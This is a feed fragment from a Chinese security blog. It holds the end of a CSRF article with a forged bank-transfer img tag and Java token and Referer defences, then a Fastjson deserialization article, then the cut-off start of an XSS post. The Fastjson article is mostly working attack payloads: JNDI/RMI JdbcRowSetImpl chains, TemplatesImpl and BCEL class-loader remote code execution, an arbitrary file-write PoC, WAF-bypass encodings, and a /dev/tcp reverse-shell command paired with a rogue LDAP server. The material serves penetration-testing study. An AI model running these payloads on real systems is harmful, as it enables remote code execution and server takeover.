    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">漏洞危害</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95">漏洞测试</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">漏洞修复</a><ul><li><a href="#%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B">代码示例</a></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造。</p><p>CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为</p><p>由于目标网站无token或referer限制，攻击者可以利用用户的身份，执行请求</p><p>跨站请求伪造，利用了网站允许攻击者预测特定操作所有细节这一特点。由于浏览器自动发送会话cookie等认证凭证，导致攻击者可以创建恶意的web页面来产生伪造请求。这些伪造的请求很难和合法的请求区分开</p><p>例如:</p><p>银行网站A，它以GET请求来完成银行转账的操作，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span><br></pre></td></tr></table></figure><p>危险网站B，它里面有一段HTML的代码如下：</p><p>&lt;img src&#x3D;<a href="http://www.mybank.com/Transfer.php?toBankId=11&money=1000%3E">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</a></p><p>登陆银行网站A后，在同一个浏览器去访问B网站的一个上面的请求，这个时候会发现你的账户会少了1000块。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>攻击者可以让受害者用户修改任何允许修改的数据，执行任何用户允许的操作，例如修改密码，登录注销等</p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p><strong>1.GET类型的CSRF的检测</strong></p><p>如果有token等验证参数，先去掉参数尝试能否正常请求。如果可以，即存在CSRF漏洞</p><p><strong>2.POST类型的CSRF的检测</strong></p><p>如果有token等验证参数，先去掉参数尝试能否正常请求。如果可以，再去掉referer参数的内容，如果仍然可以，说明存在CSRF漏洞，可以利用构造外部form表单的形式，实现攻击。如果直接去掉referer参数请求失败，这种还可以继续验证对referer的判断是否严格，是否可以绕过</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><strong>添加验证码</strong>：在一些特殊请求页面增加验证码，验证码强制用户必须与应用进行交互，才能完成最终请求</p><p><strong>检测refer</strong>：检测refer值，来判断请求来源是否合法。</p><p><strong>Token</strong>：在每个请求中设置Token是一种流行的方式来防御CSRF。CSRF攻击的原理：攻击者可以猜测到用户请求，现在在每个请求中加一个随机的Toekn值。</p><p>Token要足够随机————只有这样才算不可预测</p><p>Token是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度</p><p>Token要注意保密性————敏感操作使用post，防止Token出现在URL中</p><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><p><strong>Token使用</strong></p><p>说明：在重要操作的表单中增加会话生成的Token字段，一次一用，提交后在服务端校验该字段。</p><p>Java示例：用户登录后生成token:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//获取用户的输入验证业务逻辑</span><br><span class="line">String user = request.getParameter(&quot;user&quot;);</span><br><span class="line">String password = request.getParameter(&quot;password&quot;);</span><br><span class="line">String capature = request.getParameter(&quot;kaptcha&quot;);</span><br><span class="line">if(validate_user(user, password, capature)) &#123;</span><br><span class="line">sessLogin = request.getSession(true);</span><br><span class="line">sessLogin.setAttribute(&quot;LOGIN&quot;, true);</span><br><span class="line">//生成随机字符的 token 并存入到用户会话中</span><br><span class="line">sessLogin.setAttribute(&quot;csrf_token&quot;,getRandomString(20));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>页面(模板）渲染时输出token</p><p>输出到链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=logout.jsp?token=&lt;%sessLogin.getAttribute(&quot;token&quot;)%&gt;&quot;&gt;logout&lt;/a&gt;</span><br><span class="line">输出到form表单：</span><br><span class="line">&lt;form method=&quot;POST&quot;&gt;</span><br><span class="line">发信息:</span><br><span class="line">&lt;input name=&quot;message&quot; type=&quot;text&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&lt;%=sessLogin.getAttribute(&quot;token&quot;)%/&gt;</span><br><span class="line">&lt;input type=submit value=&quot;post&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>服务端逻辑检查中验证token是否正确：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (sessLogin.getAttribute(&quot;token&quot;).equals(request.getParameter(&quot;token&quot;))) &#123;</span><br><span class="line">//处理应用逻辑</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>二次验证</strong></p><p>说明：在关键表单提交时，要求用户进行二次身份验证，如密码、图片验证码、短信验证码等。</p><p><strong>Referer 验证</strong></p><p>说明：检验用户请求中Referer字段是否存在跨域提交的情况。</p><p>Java示例：检查请求连接的referer是否合法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String expectedRefererStartsWith = “https://xxx.test.com”</span><br><span class="line">// 从 HTTP 头中取得 Referer 值</span><br><span class="line">String referer=request.getHeader(&quot;referer&quot;);</span><br><span class="line">// 判断 Referer 是否以 https://xxx.test.com 开头</span><br><span class="line">if((referer!=null) &amp;&amp;(referer.trim().startsWith(expectedRefererStartsWith)))&#123;</span><br><span class="line">chain.doFilter(request, response);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">request.getRequestDispatcher(“error.jsp”).forward(request,response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://sobug.com/article/detail/10">https://sobug.com/article/detail/10</a><br><a href="https://xz.aliyun.com/t/7450#toc-3">https://xz.aliyun.com/t/7450#toc-3</a><br><a href="https://blog.csdn.net/weixin_45728976/article/details/104506544">https://blog.csdn.net/weixin_45728976/article/details/104506544</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3&quot;&gt;漏洞危</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson漏洞总结</title>
    <link href="https://yinwc.github.io/2020/07/21/Fastjson%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF/"/>
    <id>https://yinwc.github.io/2020/07/21/Fastjson%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF/</id>
    <published>2020-07-21T08:21:43.000Z</published>
    <updated>2023-01-28T08:26:09.076Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">fastjson反序列化漏洞原理</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B">漏洞检测</a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">攻击思路</a><ul><li><a href="#4">4</a></li><li><a href="#7">7</a></li><li><a href="#8">8</a></li><li><a href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8">不出网利用</a></li><li><a href="#%E9%AB%98%E7%89%88%E6%9C%ACjdk-jndi%E6%B3%A8%E5%85%A5">高版本jdk JNDI注入</a></li><li><a href="#fastjson-waf-%E7%BB%95%E8%BF%87">Fastjson WAF 绕过</a></li></ul></li><li><a href="#%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5">防御手段</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="fastjson反序列化漏洞原理"><a href="#fastjson反序列化漏洞原理" class="headerlink" title="fastjson反序列化漏洞原理"></a>fastjson反序列化漏洞原理</h2><p>1、开启autotype功能<br>2、当组件开启了autotype功能并且反序列化不可信数据时<br>3、Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法<br>4、若指定类的指定方法中有可被恶意利用的逻辑（Gadget）<br>5、不开启autotype可利用缓存机制进行绕过</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1.检测是否Fastjson</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;a&quot;:&quot;a\x] dos漏洞</span><br><span class="line">&#123;&quot;a&quot;:&quot;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://%s&quot;&#125;:&quot;x&quot;&#125;</span><br></pre></td></tr></table></figure><p>1.2.67版本前</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;fatu5k.dnslog.cn&quot;&#125;&#125;</span><br><span class="line">1.2.67版本后payload</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure><p>2.精确检测版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;a&quot;:&quot;a\x]</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;</span><br><span class="line">a</span><br></pre></td></tr></table></figure><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>1、基于jndi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1098/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>2、<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code><br>(限制条件：解析JSON的时候需要使用Feature)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:sss&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;###EVIL_CODE###&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;,&quot;_name&quot;:&quot;a&quot;,&quot;_version&quot;:&quot;1.0&quot;,&quot;allowedProtocols&quot;:&quot;all&quot;&#125;</span><br></pre></td></tr></table></figure><p>3、<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code><br>(限制条件：应用部署在Tomcat应用环境中 Tomcat 8.0以后使用org.apache.tomcat.dbcp.dbcp2.BasicDataSource Tomcat 8.0以下使用org.apache.tomcat.dbcp.dbcp.BasicDataSource )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.commons.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;:&quot;###EVIL_CODE###&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;c&quot;:&#123;&quot;@type&quot;:&quot;org.apache.commons.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;:&#123;&quot;@type&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;:&quot;###EVIL_CODE###&quot;&#125;&#125;:&quot;ddd&quot;</span><br></pre></td></tr></table></figure><h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>1.2.25 以后autotype默认开启，所以41-45的一些Poc这里也不再列出， 我们直接跳到1.2.48以下不需要开启autotype下的Poc，其实1.2.47之前的Poc都可以改成绕过autotype格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a&quot;: &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; &#125;, &quot;b&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi://x.x.x.x:1098/jndi&quot;, &quot;autoCommit&quot;: true&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h3><p>48以后68之前的Poc也需要目标开启autotype了，这里也跳过，直接看68的Poc，无须开启autype</p><p>fastjson-1.2.68 任意文件写入poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;sun.rmi.server.MarshalOutputStream&quot;,&quot;out&quot;:&#123;&quot;@type&quot;:&quot;java.util.zip.InflaterOutputStream&quot;,&quot;out&quot;:&#123;&quot;@type&quot;:&quot;java.io.FileOutputStream&quot;,&quot;file&quot;:&quot;/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/charsets.jar&quot;,&quot;append&quot;:false&#125;,&quot;infl&quot;:&#123;&quot;input&quot;:&quot;xxx&quot;&#125;,&quot;bufLen&quot;:1048576&#125;,&quot;protocolVersion&quot;:1&#125;&#125;</span><br><span class="line">&#123;&quot;x&quot;:&#123;&quot;@type&quot;:&quot;java.nio.charset.Charset&quot;,&quot;val&quot;:&quot;500&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>fastjson-1.2.68 jdbc反序列化poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;172.20.64.40&quot;,&quot;portToConnectTo&quot;:3306,&quot;url&quot;:&quot;jdbc:mysql://172.20.64.40:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;databaseToConnectTo&quot;:&quot;test&quot;,&quot;info&quot;:&#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;PORT&quot;:&quot;3306&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;,&quot;user&quot;:&quot;yso_URLDNS_http://ahfladhjfd.6fehoy.dnslog.cn&quot;,&quot;PORT.1&quot;:&quot;3306&quot;,&quot;HOST.1&quot;:&quot;172.20.64.40&quot;,&quot;NUM_HOSTS&quot;:&quot;1&quot;,&quot;HOST&quot;:&quot;172.20.64.40&quot;,&quot;DBNAME&quot;:&quot;test&quot;&#125;&#125;</span><br><span class="line">java -jar .\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/#ExportObject 1099</span><br><span class="line"></span><br><span class="line">python3 -m http.server 2333</span><br></pre></td></tr></table></figure><h3 id="不出网利用"><a href="#不出网利用" class="headerlink" title="不出网利用"></a>不出网利用</h3><p>参考：<a href="https://mp.weixin.qq.com/s/LZt-I3s0dQ_bK9ubEix8iQ">https://mp.weixin.qq.com/s/LZt-I3s0dQ_bK9ubEix8iQ</a></p><p>这里主要基本Poc使用1.2.24 无需出网Poc + 1.2.47嘚绕过autotype</p><p>首先获取恶意class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class Calc&#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            Runtime.getRuntime().exec(new String[]&#123;&quot;cmd&quot;, &quot;/c&quot;, &quot;calc&quot;&#125;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取到class文件后，转化为BCEL格式(建议以上两步在低版本jdk下运行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line">import java.io.BufferedWriter;</span><br><span class="line">import java.io.FileWriter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Path;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class Test&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        Path path = Paths.get(&quot;D:\\java\\java_tools\\Calc.class&quot;);</span><br><span class="line">        byte[] bytes = Files.readAllBytes(path);</span><br><span class="line">        System.out.println(bytes.length);</span><br><span class="line">        String result = Utility.encode(bytes,true);</span><br><span class="line">        BufferedWriter bw = new BufferedWriter(new FileWriter(&quot;D:\\java\\java_tools\\bb.txt&quot;));</span><br><span class="line">        bw.write(&quot;$$BCEL$$&quot; + result);</span><br><span class="line">        bw.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>基于&lt;&#x3D;1.2.47版本的缓存类的绕过黑名单的方式修改原有poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;c&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,</span><br><span class="line">        &quot;driverClassLoader&quot;: &#123;</span><br><span class="line">            &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;driverClassName&quot;: &quot;###EVIL_CODE###&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高版本jdk-JNDI注入"><a href="#高版本jdk-JNDI注入" class="headerlink" title="高版本jdk JNDI注入"></a>高版本jdk JNDI注入</h3><p>参考项目：<a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a><br>漏洞原理：<a href="https://paper.seebug.org/942/#ldapgadget">https://paper.seebug.org/942/#ldapgadget</a></p><p>1.填写好你的反弹命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/你的vpsip/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>2.runtime base64编码</p><p>访问<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p>把第一步的命令粘进去，自动编码，复制下来把bash的关键字都改为sh</p><p>3.使用RogueJndi-1.0开启ldap</p><p>java -jar RogueJndi-1.0.jar -n “0.0.0.0” -c “写入第二步的命令”</p><p>4.jndi地址为</p><p>ldap:&#x2F;&#x2F;vpsip:1389&#x2F;o&#x3D;tomcat</p><p>注：rogue-jndi 没法绕tomcat7</p><h3 id="Fastjson-WAF-绕过"><a href="#Fastjson-WAF-绕过" class="headerlink" title="Fastjson WAF 绕过"></a>Fastjson WAF 绕过</h3><p>1、unicode编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;b&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065&quot;:&quot;ldap://t00ls.5cd37009d59fc2c7fc55f2bee57cafab.dnslog.cn/aaa&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p>2、XCTF-校战“疫”中的ctf题目的一个payload：<code>\x74</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@\x74ype&quot;:&quot;org.apache.commons.configuration.JNDIConfiguration&quot;,&quot;- prefix&quot;:&quot;rmi://xxx.xxx&quot;&#125;</span><br></pre></td></tr></table></figure><p>3、<code>\b</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:\b&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:9999&quot;,&quot;autoCommit&quot;:true&#125;&#125;</span><br></pre></td></tr></table></figure><p>4、<code>/**/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:/**/&quot;Lcom.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;###RMI_LDAP_ADDRESS###&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>1、设置黑名单与白名单</p><p>2、禁用autotype等关键词，可以在WAF上设置</p><p>3、升级fastjson版本</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://mp.weixin.qq.com/s/QGyb1Zv4F9IvmjKfiCD_4Q">Skay:Fastjson渗透测试指北</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;fastjson反序列化漏洞原理&lt;/a&gt;&lt;/li&gt;</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XSS漏洞总结</title>
    <link href="https://yinwc.github.io/2020/06/28/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://yinwc.github.io/2020/06/28/XSS%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2020-06-28T08:19:43.000Z</published>
    <updated>2023-01-28T08:23:59.432Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95">漏洞测试</a><ul><li><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8Bxss">反射型XSS</a></li><li><a href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss">存储型xss</a></li><li><a href="#dom-xss">DOM xss</a></li><li><a href="#%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7">一些技巧</a><ul><li><a href="#xss_cheat_sheet_2020_edition">XSS_Cheat_Sheet_2020_Edition</a></li></ul></li></ul></li><li><a href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">漏洞修复</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>XSS的漏洞主要成因是后端接收参数时未经过滤，导致参数改变了HTML的结构，从而被浏览器或后端代码执行。</p><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" 